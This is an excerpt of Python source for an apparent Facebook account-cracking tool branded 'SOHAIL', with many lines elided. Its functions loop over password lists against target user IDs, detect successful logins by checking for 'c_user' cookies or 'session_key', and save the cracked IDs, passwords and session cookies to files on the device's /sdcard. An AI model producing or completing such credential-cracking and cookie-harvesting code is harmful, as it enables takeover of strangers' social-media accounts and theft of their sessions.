...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSOHAIL\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\033[96;1 [SOHAIL-OK] %s | %s'%(ids,pas))

                                open('/sdcard/SOHAIL-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/RAUF-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                                ...
                                if 'y' in pcp:
                                        ...
                                        print('\r\r\x1b[38;5;208m [SOHAIL-CP] '+ids+' | '+pas+'\033[1;97m')

                                        open('/sdcard/SOHAIL-CP.txt', 'a').write(ids+'|'+pas+'\n')
...
def api1(ids,names,passlist):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSOHAIL\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				...
				print('\r\r\033[1;32m [SOHAIL-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				...
				open('/sdcard/SOHAIL-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				...
				print(f'\r\r\033[1;33m [SOHAIL-CP] '+uid+' | '+pas+'\033[1;97m')

				open('/sdcard/SOHAIL-CP.txt','a').write(uid+'|'+pas+'\n')
...
def rd(ids,passlist):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mSOHAIL-M3\x1b[1;92m-\x1b[1;92m\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()		
    ...
    try:
        ...
        for ps in passlist:            
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m [SOHAIL-OK] '+ids+' | '+ps)                

                print('\033[1;37m [ðŸ˜ˆ] Cookies :- '+coki)                

                open('/sdcard/SOHAIL-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                ...
                print(f'\r\r\033[1;33m [SOHAIL-CP] '+ids+' | '+ps+'\033[1;97m')

                open('/sdcard/SOHAIL-CP.txt', 'a').write( ids+' | '+ps+' \n')

                cps.append(cid)

            elif twf in session.cookies.get_dict().keys():

                print('\033[1;93m\033[0;34mSOHAIL-2F '+ids+' â€¢ '+ps+'  \033[0;97m')
...
def newidx(ids,names,passlist):
	...
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;97mSOHAIL\x1b[1;92m-\x1b[1;92mM2\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
